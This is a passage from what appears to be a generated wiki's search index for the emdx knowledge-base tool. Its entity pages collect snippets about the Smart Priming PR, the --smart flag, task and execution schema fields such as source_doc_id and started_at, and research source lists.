Semantic Find | \u274c FAILING | Fix tests - add <code>--mode keyword</code> flag | | #446 | Smart Priming | \u274c FAILING | Fix ANSI code stripping in test | | #452 | Auto-Linking | \u2705 PASSING | May need depth bug fix | | #448 | Contextual Save | \u2705 PASSING | Cleanup PR #477 c...</p> </li> <li> <p>#6206 Tomorrow's Tasks: Fix Wave for 4 Sprint PRs   Section: Tomorrow's Tasks: Fix Wave for Sprint PRs</p> </li> <li>PR #453 (Ask the KB) \u2705 \u2014 DRY'd up filters, added 21 tests</li> <li>PR #451 (Knowledge Decay) \u2705 \u2014 Added unit tests</li> <li> <p>PR #446 (Smart Priming) \u2705 \u2014 Fixed DB column name, moved import, added tests</p> </li> <li> <p>#6190 Delegate: Fix PR #446 (Smart Priming). Checkout branch feat/smart-prim</p> </li> </ul>"},{"location":"entities/smart-priming/#already-fixed-tests-added-issues-resolved","title":"Already Fixed (tests added + issues resolved):","text":""},{"location":"entities/smart-priming/#fix-pr-446-smart-priming","title":"Fix PR #446 (Smart Priming)","text":""},{"location":"entities/smart-priming/#issues-fixed","title":"Issues Fixed","text":"<ol> <li>DB column name: Fixed <code>_get_recent_docs()</code> to use <code>accessed_at</code> instead of <code>last_accessed_at</code> (line 325)</li> </ol> <p>2.</p> <ul> <li> <p>#6153 PR Review Sprint: Smart Ops Synthesis   Section: Summary by PR</p> ... Feature Verdict Key Issue #446 Smart Priming \u2705 Approve with conditions Missing tests #448 Contextual Save \u2705 Approve with changes Missing tests, unused import #449 Dream Journal \u2705 Approve w... </li> <li> <p>#6146 Delegate: Review PR #446 (Smart Priming). Run: gh pr diff 446. Check c [1/7]</p> </li> </ul>"},{"location":"entities/smart-priming/#pr-446-review-smart-priming-emdx-prime-smart","title":"PR #446 Review: Smart Priming (<code>emdx prime --smart</code>)","text":""},{"location":"entities/smart-priming/#summary","title":"Summary","text":"<p>PR adds <code>--smart</code> flag to <code>emdx prime</code> command implementing context-aware priming per gameplan #6099. ## Gameplan Compliance \u2705</p> <p>| Requirement | Status | Notes | |------------|--------...</p> <ul> <li> <p>#6138 Delegate: Read gameplan by running: emdx view 6099. Implement the Smar [3/7]   Section: Smart Priming Feature Implementation Complete</p> </li> <li> <p>#6103 Gameplan #7: Ask the KB (RAG Q&amp;A)   Section: Implementation Steps</p> <p>...ade)**: chunk-level retrieval dramatically improves answer quality</p> </li> <li>Feature #3 (Smart Priming): prime could use ask to generate a session summary</li> <li> <p>Feature #5 (Dream Journal): dream could use ask to detect contradictions</p> </li> <li> <p>#6102 Gameplan #6: Knowledge Decay &amp; Spaced Resurfacing   Section: Implementation Steps</p> </li> <li>Feature #2 (Auto-Linking): link_count is a strong importance signal</li> <li>Feature #3 (Smart Priming): stale docs appear in prime output</li> <li> <p>Feature #5 (Dream Journal): dream journal includes staleness report</p> </li> <li> <p>#6099 Gameplan #3: Smart Priming</p> </li> </ul>"},{"location":"entities/smart-priming/#summary_1","title":"Summary","text":"<p>Implemented the Smart Priming feature (<code>emdx prime --smart</code>) as described in gameplan #6099.</p>"},{"location":"entities/smart-priming/#synergies","title":"Synergies","text":""},{"location":"entities/smart-priming/#gameplan-3-smart-priming-emdx-prime-smart","title":"Gameplan #3: Smart Priming (emdx prime --smart)","text":""},{"location":"entities/smart-priming/#vision","title":"Vision","text":"<p>Every Claude Code session starts with situational awareness. Instead of generic project docs, Claude gets a curated context package: recent work, key decisions, knowledge gaps, and stale do...</p> <ul> <li>#6092 PROZE/EMDX Feature Exploration - 10 Paths Deep Dive   Section: PATH 6: Context-Aware Priming \u2014 Smart Session Bootstrap </li> </ul>"},{"location":"entities/smart-priming/#why-it-matters-for-claude","title":"Why it matters for Claude","text":"<p>Every new Claude Code session starts cold. Smart priming means Claude instantly knows: \"Last session we were building the proze prototype. Here are the 3 most relevant research docs. Here are 2 open tasks.\"</p>"},{"location":"entities/smart-priming/#related-entities","title":"Related Entities","text":"<ul> <li><code>key docs</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=5.6)</li> <li><code>last_accessed_at</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=5.6)</li> <li><code>tests/test_smart_priming.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>prototype results</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>git log --oneline -3</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>git branch --show-current</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>auto-linking on save</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>_output_smart_json()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>_get_stale_docs()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> <li><code>#id \"title\" \u2014 n views</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.6)</li> </ul>"},{"location":"entities/smart/","title":"--smart","text":"<p>Type: tech_term | Mentioned in: 8 documents | First seen: 2026-02-13</p>"},{"location":"entities/smart/#documents-8","title":"Documents (8)","text":"<ul> <li> <p>#6521 Delegate synthesis [synthesis]   Section: Task 1: FEAT-5 Smart Priming (PR #446)</p> <p>PR #446 implemented a <code>--smart</code> flag for <code>emdx prime</code> with context-aware features. The PR was closed without merging on 2026-02-15. Most features have since been **implemented via alternative...</p> </li> <li> <p>#6474 EMDX Feature Implementation Synthesis   Section: Two Implementation Modes</p> <p>Mode B: Baked into Save (<code>emdx save --smart</code>) ```bash echo \"content\" | emdx save --title \"Title\" --smart</p> </li> </ul>"},{"location":"entities/smart/#automatically-checks-for-similar-docs","title":"Automatically checks for similar docs","text":""},{"location":"entities/smart/#warns-if-80-overlap-found","title":"Warns if &gt;80% overlap found","text":""},{"location":"entities/smart/#suggests-tags-from-nearest-nei","title":"Suggests tags from nearest nei...","text":"<ul> <li> <p>#6212 Delegate: Sprint PR Fixes [8/8]   Section: PR #446 (Smart Priming)</p> <p>Problem: Test <code>test_prime_help_shows_smart_option</code> checks for <code>--smart</code> in CLI help output, but the output contains ANSI escape codes that break the assertion.</p> </li> <li> <p>#6190 Delegate: Fix PR #446 (Smart Priming). Checkout branch feat/smart-prim   Section: Issues Fixed</p> <p>...structure</p> </li> <li>Smart JSON output validity and data content</li> <li>CLI integration (<code>--smart</code> flag recognized, documented in help)</li> <li> <p>Graceful degradation (git failure, malformed JSON from gh)</p> </li> <li> <p>#6150 Delegate: Review PR #448 (Contextual Save). Run: gh pr diff 448. Check [2/7]   Section: Gameplan #6097 Compliance</p> <p>...-----------------| | <code>emdx check</code> command (pre-save advisory) | \u2705 Implemented | | <code>--smart</code> flag on <code>emdx save</code> | \u2705 Implemented | | Similarity thresholds (&gt;80% duplicate, 50-80% related, &lt;50% new) | \u2705 Implemented | | Tag suggestions from neighbors (top 3 d...</p> </li> <li> <p>#6146 Delegate: Review PR #446 (Smart Priming). Run: gh pr diff 446. Check c [1/7]   Section: PR #446 Review: Smart Priming (<code>emdx prime --smart</code>)</p> </li> <li> <p>#6139 Delegate: Read gameplan by running: emdx view 6097. Implement the Cont [1/7]   Section: What was implemented:</p> <ol> <li>New <code>--smart</code> flag on <code>emdx save</code> - Baked-in duplicate detection that:</li> </ol> </li> <li>Checks for similar docs after save</li> <li>Shows warning with similar doc IDs and similarity scores</li> <li>Suggests tags from neighbors if no explicit tags provided</li> </ul>"},{"location":"entities/smart/#summary","title":"Summary","text":"<p>PR adds <code>--smart</code> flag to <code>emdx prime</code> command implementing context-aware priming per gameplan #6099.</p>"},{"location":"entities/smart/#related-entities","title":"Related Entities","text":"<ul> <li><code>_output_smart_json()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.7)</li> <li><code>total estimated effort:</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>tests/test_prime.py</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>similardoc</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>relative time formatting</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>knowledge gaps detection</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>implemented via alternative approaches</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>closed without merging</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>checkresult</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> <li><code>check_for_similar()</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=6.7)</li> </ul>"},{"location":"entities/sourcedocid/","title":"source_doc_id","text":"<p>Type: tech_term | Mentioned in: 11 documents | First seen: 2026-02-13</p>"},{"location":"entities/sourcedocid/#documents-11","title":"Documents (11)","text":"<ul> <li>#6502 None Type Analysis [1/7]   Section: emdx/commands/delegate.py <p>...tr | None = None,     draft: bool = False,     working_dir: str | None = None,     source_doc_id: int | None = None,     parent_task_id: int | None = None,     seq: int | None = None,     epic_key: str | None = None, ) -&gt; SingleResult:</p> </li> </ul> <pre><code>**Verdict: ALL NECESSA...\n\n- **#6472** EMDX Task System: Architecture, Data Model, and Integration\n  *Section: Tasks Table (Core Entity)*\n  &gt; ...cutions table |\n| `output_doc_id` | INTEGER | NULL | FK to documents (output) |\n| `source_doc_id` | INTEGER | NULL | FK to documents (input) |\n| `parent_task_id` | INTEGER | NULL | FK to tasks (hierarchy) |\n| `seq` | INTEGER | NULL | Sequence in parent group |\n|...\n\n- **#6182** Delegate: analysis,task-system [13/15]\n  *Section: Database Schema*\n  &gt; ...- `execution_id`: Links to executions table\n- `output_doc_id`: Result document\n- `source_doc_id`: Input document\n- `parent_task_id`: Hierarchical parent\n- `seq`: Sequence number in parent\n- `retry_of`: Previous attempt\n- `tags`: Comma-separated tags\n- `error`:...\n\n- **#6180** Delegate: Task System Comprehensive Analysis [15/15]\n  *Section: Core Components*\n  &gt; ...Fields for delegate activity: `prompt`, `type`, `execution_id`, `output_doc_id`, `source_doc_id`, `seq`, `retry_of`, `tags`\n\n- **#6172** Delegate: Analyze competing/overlapping concepts in emdx. The system h [8/15]\n  *Section: 2. Tasks System*\n  &gt; ...,\n  -- Delegate tracking additions:\n  prompt, type, execution_id, output_doc_id,\n  source_doc_id, parent_task_id, seq, retry_of, error, tags\n</code></pre> <ul> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 3. Tasks Table (<code>models/tasks.py</code>)</p> <p>...o executions table | | <code>output_doc_id</code> | INTEGER FK | Output document created | | <code>source_doc_id</code> | INTEGER FK | Input document used (--doc flag) | | <code>parent_task_id</code> | INTEGER FK | For group/chain hierarchies | | <code>seq</code> | INTEGER | Order in parent group | | `ret...</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: Delegate Activity Tracking Fields (added in migration 034)</p> <p>...ons table | | <code>output_doc_id</code> | INTEGER | NULL | FK to documents (output doc) | | <code>source_doc_id</code> | INTEGER | NULL | FK to documents (input context doc) | | <code>parent_task_id</code> | INTEGER | NULL | FK to tasks (for child tasks in parallel/chain) | | <code>seq</code> | INTEGER |...</p> </li> <li> <p>#6166 Delegate: Analyze how tasks integrate with cascade. Read emdx/commands [5/15]   Section: Recommendation</p> <ol> <li>Link tasks to cascade docs: Let tasks reference <code>source_doc_id</code> from cascade (already exists in schema).</li> </ol> </li> <li> <p>#6161 Delegate: Analyze task usage in prime and status commands. Read emdx/c [7/15]   Section: The Task Table Has Dual Purposes</p> <p>...ogging:** <code>prompt</code>, <code>type</code> (single/group/chain), <code>execution_id</code>, <code>output_doc_id</code>, <code>source_doc_id</code>, <code>parent_task_id</code>, <code>seq</code>, <code>retry_of</code></p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read emdx/command [4/15]   Section: Task Creation in Delegate</p> </li> <li>Creates task BEFORE execution (lines 200-209):</li> <li><code>task_type=\"single\"</code>, <code>status=\"active\"</code></li> <li>Stores <code>source_doc_id</code>, <code>parent_task_id</code>, <code>seq</code>, <code>tags</code>, <code>prompt</code></li> </ul>"},{"location":"entities/sourcedocid/#single-task-_run_single","title":"Single Task (<code>_run_single</code>)","text":""},{"location":"entities/sourcedocid/#related-entities","title":"Related Entities","text":"<ul> <li><code>retry_of</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (7 shared docs, PMI=6.3)</li> <li><code>tasks table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (6 shared docs, PMI=6.3)</li> <li><code>execution_type</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.3)</li> <li><code>dependency system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.3)</li> <li><code>chain tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (4 shared docs, PMI=6.3)</li> <li><code>task_deps table</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>task lifecycle</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>single tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>parallel tasks</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=6.3)</li> <li><code>depends_on</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (5 shared docs, PMI=6.0)</li> </ul>"},{"location":"entities/sources/","title":"sources","text":"<p>Type: heading | Mentioned in: 16 documents | First seen: 2026-02-15</p>"},{"location":"entities/sources/#documents-16","title":"Documents (16)","text":"<ul> <li>#6765 Wikipedia Stub/Orphan Detection Tooling Research (Complete)   Section: Systematic Coverage Assessment by WikiProjects <p>...fine the topic area and what articles \"should\" exist</p> </li> <li>Comparison with external sources: Cross-reference with encyclopedias, textbooks, authority lists</li> <li>Red link auditing: Systematically review red links within project scope</li> <li> <p>**Cross-language...</p> </li> <li> <p>#6748 Wikipedia Quality Assessment System \u2014 Research for Wiki Generation   Section: 1. The Full Quality Scale</p> <p>...pgrade from GA**: Professional prose, comprehensive (not just broad), high-quality sources, consistent formatting throughout</p> </li> <li> <p>#6747 dendron-deep-dive</p> <p>Boost recently accessed notes</p> </li> <li>Boost schema-matched notes ```</li> </ul>"},{"location":"entities/sources/#synthesis-what-this-means-for-emdx","title":"Synthesis: What This Means for emdx","text":"<p>Dendron's architecture validates several patterns that emdx could adopt:</p> <p>| Dendron Pattern | emdx Equivalent | Gap / Opportunity | |-------...</p> <ul> <li> <p>#6743 wiki-synthesis-research   Section: Post-synthesis Validation</p> <p>...ef validate_preservation(source_docs, article):     \"\"\"Check that code blocks from sources appear in the article.\"\"\"     all_preservables = set()     for doc in source_docs:         for p in extract_preservables(doc.content):             all_preservables.a...</p> </li> <li> <p>#6740 Academic Tool Research: Connected Papers &amp; Graph Visualization for Wiki Generation   Section: 7. Applicability to Knowledge Base Document Relationships</p> <p>...ts (shared backlinks) | | Bibliographic coupling | Documents that link to the same sources | | Citation count - node size | Access count or link count - node size | | Publication year - color | Creation/modification date - color | | Seed paper - graph | Se...</p> </li> <li> <p>#6739 Academic Tool Research: Semantic Scholar TLDR &amp; Recommendation Graph   Section: Training Data: SciTLDR Dataset</p> <ul> <li>Scale: 5.4K TLDRs over 3.2K papers</li> </ul> </li> <li>Sources: Both author-written TLDRs and expert-derived TLDRs</li> <li> <p>Annotation protocol: Novel protocol that produces high-quality summaries while minimizing annotator burde...</p> </li> <li> <p>#6726 Dendron Schema System Deep Dive</p> <p>Does NOT recurse to arbitrary depth. ## Sources</p> </li> <li> <p>wiki.dendron.so/notes/c5e5adde-5459-409b-b34d-a0d75cbb1052/</p> </li> <li>wiki.dendron.so/notes/5U4eAiqshI67VxIL40KWH/</li> <li>docs.dendron.so/notes/xSSUw9GWcnsF35y597Vof/</li> <li>github.com/Bassmann/dendron-schemas</li> <li> <p>githu...</p> </li> <li> <p>#6664 Claude Code CLAUDE.md System \u2014 Deep Architecture Research   Section: Why NOT inject the full codebase:</p> </li> <li>Official docs: https://code.claude.com/docs/en/memory</li> <li>Official docs: https://code.claude.com/docs/en/how-claude-code-works</li> <li> <p>System prompt repo: https://github.c...</p> </li> <li> <p>#6596 Delegate: Research import paths \u2014 how should emdx import from Obsidian [3/4]</p> <p>Git-friendly: Single source of truth, not folder-sync chaos</p> </li> </ul> <p>The import command is the bridge \u2014 people start with their existing notes, then discover emdx's unique capabilities. ---</p>"},{"location":"entities/sources/#sources_1","title":"Sources","text":""},{"location":"entities/sources/#sources_2","title":"Sources","text":"<ul> <li> <p>[Obsidian Importer](https://github.com/obsidi...</p> </li> <li> <p>#6423 Delegate: Research upgrading pytest from 7.x to 9.x, pytest-cov from 4 [1/5]   Section: PYTEST 9.0 BREAKING CHANGES</p> </li> <li> <p><code>monkeypatch.syspath_prepend()</code> warns for legacy <code>pkg_resources.declare_namespace()</code> packages</p> </li> <li> <p>#6422 Delegate: Research upgrading rich from 13.x to 14.x. Identify breaking [3/5]   Section: Upgrade Recommendation</p> </li> <li>Rich CHANGELOG.md</li> <li>Rich Releases</li> <li> <p>[Textual pyprojec...</p> </li> <li> <p>#6421 Delegate: Research upgrading the anthropic Python SDK from 0.40.0 to 0 [2/5]   Section: Migration Verdict: \u2705 SAFE TO UPGRADE</p> </li> <li>https://github.com/anthropics/anthropic-sdk-python/blob/main/CHANGELOG.md</li> <li>https://github.com/anthropics/anthropic-sdk-python/releases</li> <li> <p>https://docs.anthropic.com/en/api/client-sdks</p> </li> <li> <p>#6420 Delegate: Research upgrading click from 8.1 to 8.3. Identify any break [5/5]</p> <p>No action required unless you want to explicitly pin to 8.3.x for testing. ## Sources</p> </li> <li> <p>Click Changelog</p> </li> <li>Typer Release Notes</li> <li> <p>[Click GitHub Releas...</p> </li> <li> <p>#6387 Delegate: Research the competitive landscape for AI agent tooling in 2 [1/4]</p> <p>Context Engineering Discipline: Moving from prompt engineering to systematic design of memory, retrieval, and state management. ---</p> </li> </ul>"},{"location":"entities/sources/#namespace-package-deprecation","title":"Namespace Package Deprecation","text":""},{"location":"entities/sources/#sources_3","title":"Sources","text":""},{"location":"entities/sources/#sources_4","title":"Sources","text":""},{"location":"entities/sources/#sources_5","title":"Sources","text":""},{"location":"entities/sources/#mcp-infrastructure","title":"MCP &amp; Infrastructure","text":"<ul> <li> <p>[Google MCP Launch - TechCrunch](https://techcrunch.com/2025/12/10/google-...</p> </li> <li> <p>#6519 Delegate: Analyze FEAT-7: Re-implement ask-kb improvements (PR #453).  [2/2]   Section: <code>emdx/commands/ask.py</code> (Current State)</p> <p>...oject<code>filters | \u2705 Exists | |</code>--keyword<code>(force keyword search) | \u2705 Exists | |</code>--sources/--no-sources<code>toggle | \u2705 Exists | |</code>--verbose<code>debug mode | \u2705 Exists | |</code>emdx ai context<code>(pipe to claude) | \u2705 Exists | |</code>emdx ai index` (build embeddings) | \u2705 Ex...</p> </li> <li> <p>#6751 Academic Tool Research for Wiki Generation [3/4]   Section: GA vs FA \u2014 The Critical Differences</p> <p>...: GA = broad (main aspects addressed); FA = comprehensive (no major gaps)*</p> </li> <li>Sources: GA = reliable; FA = high-quality reliable</li> <li>Citations: GA = identifiable; FA = consistently formatted</li> <li>Review: GA = 1 reviewer; FA = **several ed...</li> </ul>"},{"location":"entities/sources/#related-entities","title":"Related Entities","text":"<ul> <li><code>start</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (3 shared docs, PMI=5.7)</li> <li><code>wikipedia quality assessment system</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>upgrade research</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>training data</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>systematic review</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>objective revision evaluation service</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>high-quality reliable</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>generated wiki pages</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>english wikipedia</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> <li><code>dropped python</code> \u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588\u2588 (2 shared docs, PMI=5.7)</li> </ul>"},{"location":"entities/startedat/","title":"started_at","text":"<p>Type: tech_term | Mentioned in: 15 documents | First seen: 2026-02-13</p>"},{"location":"entities/startedat/#documents-15","title":"Documents (15)","text":"<ul> <li> <p>#6708 Delegate: Analyze how running delegates are tracked in the database. R [3/4]   Section: The <code>executions</code> Table Schema (final form)</p> <p>...tion | | <code>status</code> | TEXT NOT NULL | <code>'running'</code>, <code>'completed'</code>, or <code>'failed'</code> | | <code>started_at</code> | TIMESTAMP NOT NULL | When execution began | | <code>completed_at</code> | TIMESTAMP (nullable) | When execution finished (NULL while running) | | <code>log_file</code> | TEXT NOT NULL...</p> </li> <li> <p>#6515 Any removal Phase 2: UI TypedDicts   Section: 1. Created <code>emdx/ui/types.py</code></p> <p>...ata used by <code>CascadeRunItem</code> in the activity view. Fields include <code>id</code>, <code>status</code>, <code>started_at</code>, <code>completed_at</code>, <code>pipeline_name</code>, <code>pipeline_display_name</code>, <code>current_stage</code>, <code>initial_doc_title</code>, <code>doc_id</code>, <code>error_message</code>.</p> </li> <li> <p>#6491 Any Type Removal Analysis [1/5]   Section: 4. Line 152: <code>CascadeRunItem.cascade_run</code> field</p> <p>...pipeline_name: str     pipeline_display_name: str     initial_doc_title: str     started_at: datetime | str     completed_at: datetime | str | None     error_message: str | None</p> </li> </ul> <pre><code>\n- **#6488** Any Type Removal Analysis [1/5]\n  *Section: Occurrence 7: `cascade_run: dict[str, Any]` field*\n  &gt; class CascadeRunDict(TypedDict, total=False):\n    id: int\n    pipeline_name: str\n    pipeline_display_name: str\n    initial_doc_title: str\n    started_at: str | datetime\n    completed_at: str | datetime\n    error_message: str | None\n</code></pre> <ul> <li> <p>#6472 EMDX Task System: Architecture, Data Model, and Integration   Section: Task Executions (Join Table)</p> <p>...workflow removed) | | <code>status</code> | TEXT | running, completed, failed, cancelled | | <code>started_at</code> | TIMESTAMP | Execution start time | | <code>completed_at</code> | TIMESTAMP | Execution end time | | <code>notes</code> | TEXT | Optional execution notes |</p> </li> <li> <p>#6466 Fix: Execution Dataclass Schema-Model Mismatch in EMDX   Section: 2. Fixed Heartbeat Functionality</p> <ul> <li><code>get_stale_executions()</code>: Removed references to the non-existent <code>last_heartbeat</code> column. Now uses only <code>started_at</code> for timeout detection, relying on the <code>Execution.is_zombie</code> property for more reliable PID-based process checking.</li> </ul> </li> <li> <p>#6404 Bug Fix PR Reviews [6/6]   Section: 4. ALLOWED_COLUMNS Whitelists - \u26a0\ufe0f INCOMPLETE</p> <p>ALLOWED_EXECUTION_COLUMNS appears complete - <code>started_at</code> is never updated via kwargs.</p> </li> <li> <p>#6372 Codebase Bug Audit 2026-02-15 [4/10]   Section: Summary</p> <p><code>update_execution_heartbeat()</code> runs:</p> </li> </ul> <pre><code>UPDATE executions SET started_at = started_at WHERE id = ? AND status = 'running'\n</code></pre> <ul> <li> <p>#6277 Delegate: DEBT-2: Fix schema-model mismatch. The Execution dataclass i   Section: DEBT-2: Fix schema-model mismatch in Execution dataclass</p> <ol> <li>Fixed <code>get_stale_executions()</code> - Removed references to <code>last_heartbeat</code>, now uses only <code>started_at</code> for timeout detection. The <code>Execution.is_zombie</code> property (PID-based detection) provides more reliable zombie detection anyway.</li> </ol> </li> <li> <p>#6268 Delegate: Document #6230 (Migration/Schema Debt Implementation)   Section: 2. Fixed Heartbeat Functionality (MEDIUM severity)</p> <ul> <li><code>get_stale_executions()</code>: Updated to use only <code>started_at</code> for staleness detection instead of the non-existent <code>last_heartbeat</code> column</li> </ul> </li> <li> <p><code>update_execution_heartbeat()</code>: Made into a no-op with documentation explaining th...</p> </li> <li> <p>#6246 Delegate: Document #6230 (Delegate: Audit SECURITY DEBT in the emdx pr [5/37]   Section: Changes Made</p> <ul> <li><code>get_stale_executions()</code>: Updated to use only <code>started_at</code> for timeout detection instead of the non-existent <code>last_heartbeat</code> column. Uses <code>is_zombie</code> property for pid-based process checking.</li> </ul> </li> <li> <p>#6182 Delegate: analysis,task-system [13/15]   Section: Database Schema</p> <p>...n_id`: Links to executions</p> </li> <li><code>status</code>: running | completed | failed | cancelled</li> <li><code>started_at</code>, <code>completed_at</code>: Timestamps</li> <li> <p><code>notes</code>: Execution notes</p> </li> <li> <p>#6170 Delegate: Analyze the task execution tracking system. Read emdx/models [9/15]   Section: 1. Executions Table (<code>models/executions.py</code>)</p> <p>...TEXT | Title for the execution | | <code>status</code> | TEXT | running/completed/failed | | <code>started_at</code> | TIMESTAMP | When execution began | | <code>completed_at</code> | TIMESTAMP | When execution finished | | <code>log_file</code> | TEXT | Path to log file | | <code>exit_code</code> | INTEGER | Pro...</p> </li> <li> <p>#6168 Delegate: Analyze the emdx task system's data model and database schem [1/15]   Section: task_executions Table (Join Table)</p> <p>...\"manual\" | | <code>status</code> | TEXT | \"running\", \"completed\", \"failed\", \"cancelled\" | | <code>started_at</code> | TIMESTAMP | When execution started | | <code>completed_at</code> | TIMESTAMP | When execution ended | | <code>notes</code> | TEXT | Optional execution notes |</p> </li> <li> <p>#6160 Delegate: Analyze how tasks integrate with delegate. Read 